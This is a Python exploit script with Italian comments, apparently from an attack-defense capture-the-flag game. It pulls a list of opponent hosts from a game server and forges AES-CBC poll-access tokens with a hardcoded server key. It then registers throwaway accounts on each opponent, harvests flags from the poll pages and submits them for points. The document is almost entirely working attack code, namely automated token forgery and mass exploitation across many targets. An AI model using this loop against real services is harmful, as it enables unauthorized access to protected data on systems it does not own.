'''

L'obiettivo di questo exploit/attacco è quello di catturare flag accedendo a sondaggi tramite l'utilizzo di un token. 
La creazione di questo token avviene tramite una crittografia (AES in modalità CBC, che è la stessa utilizzata dall'applicazione 
per la creazione dei token da fornire agli utenti).

'''


import requests
import json
import random
import string
import re
from Crypto.Cipher import AES




# Specifico il mio indirizzo IP e quello del dispositivo NOP, che saranno poi esclusi dall'attacco
my_ip = '11.0.1.1'
nop_ip = '11.0.0.1'
header = {"X-Team-Token": "9b8fec624b7ea21a"}
# Ricordiamo che una flag è una stringa alfanumerica di 31 caratteri seguiti da un =
flag_regex = re.compile(r"[A-Z0-9]{31}=")

# Otteniamo i dati degli avversari
opponents = requests.get("http://11.11.0.1:8080/api/client/attack_data").text
opponents = json.loads(opponents)
# Prelevo le informazioni riguardo il servizio che mi interessa
opponents = opponents['Polls']
opponents.pop(my_ip)
opponents.pop(nop_ip)

# Chiave segreta del server: in questo caso la chiave la conosciamo a priori in quanto fornita da noi nel codice; per
# rendere il codice più complesso dovremmo ricavare la key dinamicamente
server_key = b"16_r4ndom_bytes!"  



def create_token(poll_id, server_key):
    # Creo un oggetto cifrario sfruttando la conoscenza della server_key e la modalità CBC
    cipher = AES.new(server_key, AES.MODE_CBC)
    # Dopo aver convertito l'id da stringa a bytes e aver effettuato il padding aggiungendo spazi 
    # finchè non si arriva a 16 byte, possiamo cifrare il messaggio
    token = cipher.encrypt(poll_id.encode().ljust(16))
    # L'IV deve essere concatenato al messaggio cifrato; si aggiunge l'IV perche sarà necessario per decifrare il messaggio
    token = cipher.iv + token

    return token




def submit_flags(payload):
    url = "http://11.11.0.1:8080/flags"
    print(requests.put(url, headers = header, json = payload).text)




def exploit():
    for ip, poll_ids in opponents.items():
        try:
            payload = []
            # Generazione casuale per ottenere le credenziali di un utente fittizio
            username_length = random.randint(5, 64)
            password_length = random.randint(5, 64)
            data = {
                "username": ''.join(random.choices(string.digits, k = username_length)),
                "password": ''.join(random.choices(string.digits, k = password_length))
            }

            # Creiamo una sessione per l'utente
            s = requests.Session()

            # Registrazione e login 
            s.post(f"http://{ip}:5000/register", data = data)
            s.post(f"http://{ip}:5000/login", data = data)

            for poll_id in poll_ids:
                # Creazione del token 
                token = create_token(poll_id, server_key)
                
                # Accesso al sondaggio tramite token
                response = s.post(f"http://{ip}:5000/access_poll", data = {"token": token.hex()})
                
                # Verifica della risposta e raccolta delle flag
                if "Token invalido, riprovare." in response.text:
                    print(f"Errore: Token non valido per il sondaggio {poll_id}")
                    continue
                
                flags = flag_regex.findall(response.text)
                payload.extend(flags)

            # Invia le flag raccolte
            submit_flags(payload)

        except Exception as e:
            print(f"Failed to exploit {ip}! {str(e)}")
